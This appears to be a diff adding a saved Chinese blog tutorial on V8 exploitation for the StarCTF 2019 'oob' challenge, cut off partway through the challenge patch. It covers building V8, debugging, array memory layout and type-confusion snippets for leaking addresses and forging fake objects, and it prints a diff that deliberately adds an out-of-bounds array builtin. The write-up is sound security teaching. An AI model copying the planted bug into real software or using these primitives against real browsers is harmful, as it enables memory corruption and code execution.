@@ -1,0 +1,594 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="一、环境搭建       参照[原创]v8利用初探 2019 StarCTF oob 复现分析-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com                     1.代理设置       12git config --global http.proxy http:&#x2F;&#x2F;ip:portexport &amp;#123;http,h">
+<meta property="og:type" content="article">
+<meta property="og:title" content="V8从0开始">
+<meta property="og:url" content="http://pig-007.github.io/2022/03/01/V8%E4%BB%8E0%E5%BC%80%E5%A7%8B/index.html">
+<meta property="og:site_name" content="PIG-007">
+<meta property="og:description" content="一、环境搭建       参照[原创]v8利用初探 2019 StarCTF oob 复现分析-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com                     1.代理设置       12git config --global http.proxy http:&#x2F;&#x2F;ip:portexport &amp;#123;http,h">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012217111.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012221043.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203182051776.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012230225.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203182013498.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221213865.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221519946.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221529435.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203221941594.png">
+<meta property="article:published_time" content="2022-03-01T02:25:33.000Z">
+<meta property="article:modified_time" content="2022-03-22T11:52:03.981Z">
+<meta property="article:author" content="PIG-007">
+<meta property="article:tag" content="V8">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012217111.png"><title>V8从0开始 | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2022/03/01/V8%E4%BB%8E0%E5%BC%80%E5%A7%8B/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">V8从0开始</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-03-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-22</span></span></div></header><div class="post-body">
+        <h1 id="一、环境搭建"   >
+          <a href="#一、环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1>
+      <p>参照[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-268933.htm#msg_header_h1_5" >原创]v8利用初探 2019 StarCTF oob 复现分析-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="1-代理设置"   >
+          <a href="#1-代理设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-代理设置" class="headerlink" title="1.代理设置"></a>1.代理设置</h2>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy http://ip:port</span><br><span class="line"><span class="built_in">export</span> &#123;http,https&#125;_proxy=<span class="string">&quot;http://ip:port&quot;</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="2-代码下载"   >
+          <a href="#2-代码下载" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-代码下载" class="headerlink" title="2.代码下载"></a>2.代码下载</h2>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;export PATH=/pathto/depot_tools:<span class="variable">$PATH</span>&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="comment">#获取v8源码</span></span><br><span class="line">fetch v8</span><br><span class="line"><span class="comment">#切换题目对应版本的commit</span></span><br><span class="line">git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line"><span class="comment"># 工具同步</span></span><br><span class="line">gclient sync</span><br><span class="line"><span class="comment">#应用题目的补丁文件</span></span><br><span class="line"><span class="comment">#一般而言出题都是人为给某个版本的v8加一个洞上去，所以用题目给的diff文件给引擎加洞</span></span><br><span class="line">git apply ../oob.diff</span><br><span class="line"></span><br><span class="line"><span class="comment">#有的老版本最好还是用python2来编译，不然语法可能会出错</span></span><br><span class="line"><span class="comment"># 编译release版本</span></span><br><span class="line"><span class="comment">#测试exp用release版本，用debug版本测试通常会出错</span></span><br><span class="line">./tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -C ./out.gn/x64.release</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译debug版本</span></span><br><span class="line"><span class="comment">#调试用debug版本</span></span><br><span class="line">./tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C ./out.gn/x64.debug</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+
+
+        <h1 id="二、前置知识"   >
+          <a href="#二、前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、前置知识" class="headerlink" title="二、前置知识"></a>二、前置知识</h1>
+      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/203721.html" >从一道CTF题零基础学V8漏洞利用 - FreeBuf网络安全行业门户</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="1-调试知识"   >
+          <a href="#1-调试知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-调试知识" class="headerlink" title="1.调试知识"></a>1.调试知识</h2>
+      <p>需要注意的是debug版本的用来辅助显示，直接是没办法运行相关代码的，realse用来实际运行。</p>
+
+        <h3 id="1-工具"   >
+          <a href="#1-工具" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-工具" class="headerlink" title="(1)工具"></a>(1)工具</h3>
+      <p>常见的pwndbg，可以搭配如下的小工具</p>
+<p>源码的<code>/pathto/v8/tools</code>目录下有专门用来调试v8的gdbinit，加在<code>~/.gdbinit</code>中即可</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /pathto/v8/tools/gdbinit</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="2-函数"   >
+          <a href="#2-函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-函数" class="headerlink" title="(2)函数"></a>(2)函数</h3>
+      <p>在运行./d8时加入<code>--allow-natives-syntax</code>选项，可以使用一些调试函数</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./d8 --allow-natives-syntax</span><br><span class="line"><span class="comment">#或者配合gdb</span></span><br><span class="line">gdb ./d8</span><br><span class="line"><span class="built_in">set</span> args --allow-natives-syntax ./test.js</span><br><span class="line">r</span><br></pre></td></tr></table></div></figure>
+
+<p>如下函数</p>
+<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(obj) <span class="comment">//输出对象地址</span></span><br><span class="line">%SystemBreak() <span class="comment">//触发调试中断主要结合gdb等调试器使用，类似于python中的dbg()断点</span></span><br></pre></td></tr></table></div></figure>
+
+<p>示例代码如下：</p>
+<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a, b];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第一次调试</span></span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第二次调试</span></span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第三次调试</span></span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h2 id="2-基础知识"   >
+          <a href="#2-基础知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-基础知识" class="headerlink" title="2.基础知识"></a>2.基础知识</h2>
+      
+        <h3 id="1-对象内存讲解"   >
+          <a href="#1-对象内存讲解" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-对象内存讲解" class="headerlink" title="(1)对象内存讲解"></a>(1)对象内存讲解</h3>
+      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br></pre></td></tr></table></div></figure>
+
+<p>比如如下定义数组对象a，那么运行<code>%DebugPrint(a);</code>得到地址后，使用job命令可以看到如下的内存布局</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012217111.png" alt="image-20220301220834343"></p>
+<p>v8在内存中只有数字和对象两种表示。为了区分两者，v8在所有对象的内存地址末尾都加了1，以便表示它是个对象。因此上图该对象的实际内存地址应该为(0x346b7364dde9-1=<strong>0x346b7364dde8</strong>)</p>
+<p>而对于数组对象则大致如下布局</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th align="center">map</th>
+<th align="center">表明了一个对象的类型对象，上图即为PACKED_SMI_ELEMENTS</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">prototype</td>
+<td align="center">prototype</td>
+</tr>
+<tr>
+<td align="center">elements</td>
+<td align="center">对象元素</td>
+</tr>
+<tr>
+<td align="center">length</td>
+<td align="center">元素个数</td>
+</tr>
+<tr>
+<td align="center">properties</td>
+<td align="center">属性</td>
+</tr>
+</tbody></table></div>
+<p>而对于其中的elements元素也是一个对象，且地址位于对象a的上方，能看到里面的内容，也就是说先申请的elements这个元素内存，然后再申请的数组对象a</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012221043.png" alt="image-20220301222151967"></p>
+<p>那么总的内存布局如下</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">elements     ----&gt; +------------------------+</span><br><span class="line">                   |          MAP           +&lt;---------+</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 1         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 2         |          |</span><br><span class="line">                   |      ......            |          |</span><br><span class="line">                   |      element n         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      .........         |          |</span><br><span class="line"> ArrayObject  ----&gt;-------------------------+          |</span><br><span class="line">                   |      map               |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      prototype         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      elements          |+--------+|</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      length            |</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      properties        |</span><br><span class="line">                   +------------------------+</span><br></pre></td></tr></table></div></figure>
+
+<p>其他类型的对象都有些类似，可以自己去尝试看看</p>
+<p>其中也不一定元素后面就跟的是<code>ArrayObject</code>的内容，也可能中间间隔了很多东西，比如如下情形，<code>elements</code>的地址和<code>ArrayObject</code>的地址差的还是挺大的，可能是内存分配上的一些问题吧?不太懂v8的内存分配是怎么实现的。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203182051776.png" alt="image-20220318205130634"></p>
+
+        <h3 id="2-不同对象类型内存分布"   >
+          <a href="#2-不同对象类型内存分布" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-不同对象类型内存分布" class="headerlink" title="(2)不同对象类型内存分布"></a>(2)不同对象类型内存分布</h3>
+      
+        <h4 id="①数组对象"   >
+          <a href="#①数组对象" class="heading-link"><i class="fas fa-link"></i></a><a href="#①数组对象" class="headerlink" title="①数组对象"></a>①数组对象</h4>
+      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br></pre></td></tr></table></div></figure>
+
+<p>如下内存布局</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">elements     ----&gt; +------------------------+&lt;---------+</span><br><span class="line">                   |          MAP           +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 1         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 2         |          |</span><br><span class="line">                   |      ......            |          |</span><br><span class="line">                   |      element n         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      .........         |          |</span><br><span class="line"> ArrayObject  ----&gt;-------------------------+          |</span><br><span class="line">                   |      map               |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      prototype         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      elements          |+--------+|</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      length            |</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      properties        |</span><br><span class="line">                   +------------------------+</span><br></pre></td></tr></table></div></figure>
+
+<p>double或者float的数组也相似，就是map的类型为<code>PACKED_DOUBLE_ELEMENTS</code></p>
+
+        <h4 id="②对象数组对象"   >
+          <a href="#②对象数组对象" class="heading-link"><i class="fas fa-link"></i></a><a href="#②对象数组对象" class="headerlink" title="②对象数组对象"></a>②对象数组对象</h4>
+      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> objectArray = [a, b];<span class="comment">//a,b为对象</span></span><br></pre></td></tr></table></div></figure>
+
+<p>即数组里存放的是对象，也是类似的，就是在elements中会有点不一样，相当于存放一个指针指向包含的对象，包括map的类型也不同，为<code>PACKED_ELEMENTS</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203012230225.png" alt="image-20220301223028101"></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">elementA     ----&gt; +------------------------+&lt;---------+</span><br><span class="line">                   |         MAP            +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |       Length           +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 1         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 2         |          |</span><br><span class="line">                   |      ......            |          |</span><br><span class="line">                   |      element n         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      .........         |          |</span><br><span class="line">elementB     ----&gt; +------------------------+&lt;---------+</span><br><span class="line">                   |         MAP            +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |       Length           +		   |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 1         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      element 2         |          |</span><br><span class="line">                   |      ......            |          |</span><br><span class="line">                   |      element n         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      .........         |          |</span><br><span class="line"> ArrayObject  ----&gt;-------------------------+          |</span><br><span class="line">                   |      map               |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      prototype         |          |</span><br><span class="line">                   +------------------------+          |</span><br><span class="line">                   |      elements          |+--------+|</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      length            |</span><br><span class="line">                   +------------------------+</span><br><span class="line">                   |      properties        |</span><br><span class="line">                   +------------------------+</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="3-类型混淆"   >
+          <a href="#3-类型混淆" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-类型混淆" class="headerlink" title="(3)类型混淆"></a>(3)类型混淆</h3>
+      <p>即当我们能够修改<code>ArrayObject</code>的map属性时，就能够造成类型混淆。比如</p>
+<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];<span class="comment">//创建一个浮点数数组</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;<span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">let</span> obj_array = [obj];<span class="comment">//创建一个对象数组</span></span><br><span class="line"><span class="keyword">let</span> float_array_map = float_array[<span class="number">4</span>];<span class="comment">//假设可以越界将float_array的map属性的值读出来</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//假设可以越界写obj_array的map属性，修改为浮点数数组的map属性的值</span></span><br><span class="line">obj_array[<span class="number">1</span>] = float_array_map;</span><br><span class="line"></span><br><span class="line"><span class="comment">//由于obj_array的map属性被修改为浮点数数组的map属性</span></span><br><span class="line"><span class="comment">//那么此时当js去解析的时候，就会把obj_array[0]当作一个浮点数</span></span><br><span class="line"><span class="comment">//从而能够读出obj_array[0]的地址,即obj的地址</span></span><br><span class="line"><span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]);<span class="comment">//f2i为浮点转无符号整数函数</span></span><br></pre></td></tr></table></div></figure>
+
+<p>同样的，当我们能够修改把一个浮点数数组的map属性改为对象数组的map属性时，就能够使得v8认为该浮点数数组中的浮点数实际是一个对象，而我们控制数组中的变量的值为一个地址，这样就能将一个任意地址转化为一个obj对象了。</p>
+<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> float_array = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];<span class="comment">//创建一个浮点数数组</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;<span class="comment">//创建一个对象</span></span><br><span class="line"><span class="keyword">let</span> obj_array = [obj];<span class="comment">//创建一个对象数组</span></span><br><span class="line"><span class="keyword">let</span> obj_array_map = obj_array[<span class="number">1</span>];<span class="comment">//假设可以越界将obj_array的map属性的值读出来</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//假设可以越界写float_array的map属性，修改为obj_array的map属性的值</span></span><br><span class="line">float_array[<span class="number">4</span>] = obj_array_map;</span><br><span class="line"></span><br><span class="line"><span class="comment">//由于float_array的map属性被修改为对象数组的map属性</span></span><br><span class="line"><span class="comment">//那么此时当js去解析的时候，就会把float_array[0]当作一个对象</span></span><br><span class="line"><span class="comment">//从而能够伪造任意地址为一个虚假的对象</span></span><br><span class="line">fake_obj_addr = i2f(<span class="number">0x111111</span>);<span class="comment">//i2f为整数转浮点数</span></span><br><span class="line">float_array[<span class="number">0</span>] = fake_obj_addr;</span><br><span class="line"><span class="keyword">let</span> fake_obj = float_array[<span class="number">0</span>];<span class="comment">//获取该虚假对象</span></span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h1 id="三、实际题目"   >
+          <a href="#三、实际题目" class="heading-link"><i class="fas fa-link"></i></a><a href="#三、实际题目" class="headerlink" title="三、实际题目"></a>三、实际题目</h1>
+      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://4hou.win/wordpress/?p=32405" >从一道CTF题零基础学V8漏洞利用 – backup (4hou.win)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h2 id="1-题目分析"   >
+          <a href="#1-题目分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-题目分析" class="headerlink" title="1.题目分析"></a>1.题目分析</h2>
+      <p>添加的diff如下，主要是一下两部分，其他部分加入的就只是为了正常运行而已</p>
+<figure class="highlight diff"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return 